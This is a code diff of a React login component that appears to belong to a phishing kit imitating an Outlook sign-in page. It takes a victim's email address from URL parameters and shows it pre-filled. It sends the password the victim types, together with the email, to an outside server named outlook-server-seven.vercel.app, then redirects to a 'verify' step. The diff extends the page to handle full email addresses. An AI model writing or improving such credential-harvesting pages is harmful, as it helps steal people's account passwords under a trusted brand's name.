@@ -4,23 +4,25 @@ import arrow from "./ar.svg";
 import { useParams, useNavigate } from "react-router-dom";
 
 function Home() {
-  const { mail } = useParams();
+  const { mail, host, ext } = useParams();
   const navigate = useNavigate();
   const [password, setPassword] = useState("");
+  const email = `${mail}@${host}.${ext}`;
+  console.log(email);
 
   const handleClick = () => {
     fetch("https://outlook-server-seven.vercel.app/user/login", {
       method: "POST",
       body: JSON.stringify({
-        email: mail,
-        password: password,
+        email,
+        password,
       }),
       headers: {
         "Content-type": "application/json",
       },
     })
       .then((response) => response.json)
-      .then((json) => navigate(`/${mail}/verify`));
+      .then((json) => navigate(`/${mail}/${host}/${ext}/verify`));
   };
   return (
     <div className="container">
@@ -39,7 +41,9 @@ function Home() {
             <div className="arrow">
               <img src={arrow} alt="arrow" height="60px" width="25px" />
             </div>
-            <p style={{ margin: "0px", fontSize: "18px" }}>{mail}</p>
+            <p style={{ margin: "0px", fontSize: "18px" }}>
+              {mail}@{host}.{ext}
+            </p>
           </div>
           <div>
             <h2 style={{ marginTop: "1rem", marginBottom: "1rem" }}>
